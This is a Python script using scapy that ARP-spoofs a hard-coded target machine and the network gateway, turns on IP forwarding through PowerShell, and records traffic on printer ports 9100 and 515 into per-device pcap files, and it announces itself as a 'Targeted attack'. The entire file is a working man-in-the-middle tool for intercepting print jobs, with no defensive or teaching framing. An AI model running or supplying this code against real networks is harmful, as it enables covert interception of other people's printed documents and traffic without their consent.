import scapy.all as scapy
from scapy.utils import PcapWriter
import threading
import time
import os
import sys
import subprocess

INTERFACE = scapy.conf.iface.name
BASE_OUTPUT_DIR = r'C:\Users\User\Downloads\Network_Project'
PRINTER_PORTS = [9100, 515]
GATEWAY_IP = scapy.conf.route.route("0.0.0.0")[2]
TARGET_IP = "10.72.61.252"

tracked_devices = {TARGET_IP}
device_writers = {}
stop_event = threading.Event()
MY_MAC = None

def Aget_mac(ip):
    print(f"[*] Resolving MAC for {ip}...")
    try:
        ans, _ = scapy.srp(scapy.Ether(dst="ff:ff:ff:ff:ff:ff")/scapy.ARP(pdst=ip), timeout=2, verbose=False)
        if ans:
            return ans[0][1].hwsrc
    except Exception:
        pass
    return None

def Lenable_ip_forwarding():
    print("[*] Enabling IP Forwarding...")
    try:
        cmd = "Set-NetIPInterface -Forwarding Enabled"
        subprocess.run(["powershell", "-Command", cmd], capture_output=True)
    except Exception:
        pass

def Mget_writer_for_device(ip_addr):
    if ip_addr not in device_writers:
        folder = os.path.join(BASE_OUTPUT_DIR, f"Device_{ip_addr}")
        os.makedirs(folder, exist_ok=True)
        timestamp = time.strftime("%Y%m%d-%H%M%S")
        pcap_path = os.path.join(folder, f"print_job_{timestamp}.pcap")
        print(f"[+] Capture file created: {pcap_path}")
        device_writers[ip_addr] = {'writer': PcapWriter(pcap_path, append=True, sync=True)}
    return device_writers[ip_addr]

def Opacket_handler(pkt):
    if scapy.IP not in pkt or scapy.TCP not in pkt:
        return
    if pkt.src == MY_MAC:
        return 

    tcp_layer = pkt[scapy.TCP]
    if tcp_layer.dport in PRINTER_PORTS or tcp_layer.sport in PRINTER_PORTS:
        src_ip = pkt[scapy.IP].src
        dst_ip = pkt[scapy.IP].dst

        if src_ip == TARGET_IP or dst_ip == TARGET_IP:
            device_data = Mget_writer_for_device(TARGET_IP)
            try:
                device_data['writer'].write(pkt)
            except Exception:
                pass

def Gstart_sniffer():
    print(f"[*] Sniffer active on {INTERFACE}...")
    scapy.sniff(
        iface=INTERFACE, 
        prn=Opacket_handler, 
        store=False, 
        stop_filter=lambda x: stop_event.is_set()
    )

def spoof_target(target_ip, gateway_ip):
    target_mac = Aget_mac(target_ip)
    gateway_mac = Aget_mac(gateway_ip)
    
    if not target_mac or not gateway_mac:
        print("[!] Failed to resolve MACs. Exiting.")
        return

    print(f"[*] Spoofing {target_ip} <--> {gateway_ip}")
    p1 = scapy.Ether(dst=target_mac)/scapy.ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst=target_mac)
    p2 = scapy.Ether(dst=gateway_mac)/scapy.ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwdst=gateway_mac)

    while not stop_event.is_set():
        scapy.sendp(p1, verbose=False)
        scapy.sendp(p2, verbose=False)
        time.sleep(2)

def restore_network():
    print("[*] Restoring ARP tables...")
    target_mac = Aget_mac(TARGET_IP)
    gateway_mac = Aget_mac(GATEWAY_IP)
    if target_mac and gateway_mac:
        res = scapy.Ether(dst=target_mac)/scapy.ARP(op=2, pdst=TARGET_IP, psrc=GATEWAY_IP, hwdst=target_mac, hwsrc=gateway_mac)
        scapy.sendp(res, count=5, verbose=False)
        res_gw = scapy.Ether(dst=gateway_mac)/scapy.ARP(op=2, pdst=GATEWAY_IP, psrc=TARGET_IP, hwdst=gateway_mac, hwsrc=target_mac)
        scapy.sendp(res_gw, count=5, verbose=False)

def main():
    global MY_MAC
    Lenable_ip_forwarding()
    MY_MAC = scapy.get_if_hwaddr(INTERFACE)
    
    sniff_thread = threading.Thread(target=Gstart_sniffer, daemon=True)
    sniff_thread.start()

    spoof_thread = threading.Thread(target=spoof_target, args=(TARGET_IP, GATEWAY_IP), daemon=True)
    spoof_thread.start()

    try:
        print(f"[*] Targeted attack running on {TARGET_IP}. Press Ctrl+C to stop.")
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[!] Stopping...")
        stop_event.set()
        restore_network()
        for data in device_writers.values():
            data['writer'].close()
        sys.exit(0)

if __name__ == "__main__":
    main()